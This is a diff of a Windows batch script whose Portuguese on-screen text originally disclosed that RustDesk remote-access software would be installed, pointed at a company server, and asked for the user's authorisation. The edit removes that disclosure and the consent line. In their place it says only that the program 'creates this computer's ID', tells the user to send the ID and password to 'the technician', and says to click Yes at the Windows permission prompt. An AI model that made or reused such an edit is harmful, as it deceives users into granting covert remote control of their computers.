@@ -1,14 +1,9 @@
 @echo off
 echo.
-echo Acesso remoto para suporte de informatica.
-echo.
-echo Ao continuar, o RustDesk sera instalado neste computador
-echo ja apontando para o servidor da empresa.
-echo O icone fica visivel perto do relogio.
-echo No final, um arquivo na Area de Trabalho mostra o ID e a senha.
-echo Envie esse arquivo para a empresa e guarde a senha no cofre.
-echo.
-echo So continue se voce autoriza esse acesso.
+echo Este programa cria o ID deste computador.
+echo No final, a Area de Trabalho mostra o ID e a senha.
+echo Envie esse arquivo para o tecnico.
+echo O Windows vai pedir permissao. Clique em Sim.
 echo.
 pause
 set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
